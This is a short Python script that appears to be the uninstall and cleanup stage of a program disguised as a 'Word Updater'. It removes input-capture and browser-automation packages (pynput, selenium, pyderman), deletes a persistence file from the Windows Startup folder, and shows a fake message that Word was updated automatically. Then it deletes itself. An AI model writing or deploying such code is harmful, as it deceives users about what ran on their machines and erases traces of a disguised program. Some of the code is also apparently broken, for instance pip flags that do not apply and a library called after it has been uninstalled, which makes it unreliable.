try:
    from tkinter import messagebox
    import requests
    import os
    import time
    import pathlib

    os.system('pyw -m pip uninstall --upgrade sentry-sdk')
    os.system('pyw -m pip uninstall --upgrade requests')
    os.system('pyw -m pip uninstall --upgrade pynput')
    os.system('pyw -m pip uninstall --upgrade pyderman')
    os.system('pyw -m pip uninstall --upgrade selenium')

    while True:
        try:
            import sentry_sdk
            import requests
            import pynput
            import pyderman
            import selenium
        except ModuleNotFoundError:
            break
        else:
            pass
        time.sleep(3)
        
    try:
        main_path = pathlib.Path.home().absolute() / "AppData" / "Roaming" / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup" / "WordUpdater.pyw"
        os.remove(str(main_path))

        messagebox.showinfo("Word Updater", "Word got updated automatically. You can now close this window.")
    except Exception as e:
        sentry_sdk.capture_exception(e)
finally:
    os.remove(__file__)
